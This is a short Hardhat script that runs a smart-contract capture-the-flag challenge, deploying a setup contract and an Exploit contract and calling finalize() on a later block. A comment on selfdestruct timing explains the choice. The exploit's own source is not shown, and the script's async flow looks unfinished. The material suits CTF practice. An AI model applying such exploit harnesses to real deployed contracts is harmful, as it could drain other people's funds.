
import { ethers } from "hardhat";
import { parseEther } from "ethers/lib/utils";

async function main() {
    const SETUP = await ethers.getContractFactory("Setup");
    const EXPLOIT = await ethers.getContractFactory("Exploit");

    const setup = await SETUP.deploy({ value: parseEther("1") });
    const ctf = await ethers.getContractAt(
        "Challenge2",
        await setup.instance()
    );
    //
    console.log("solved:", await setup.isSolved());

    const exploit = await EXPLOIT.deploy(ctf.address);
    // not sure if this is right, finalize can not be called in the same block as the contract
    // is deployed since selfdestruct() doesn't destroy the contract until the end of the block
    ethers.provider.on('block', async () => {
        await exploit.finalize();
    });
    console.log("solved:", await setup.isSolved());
}

main();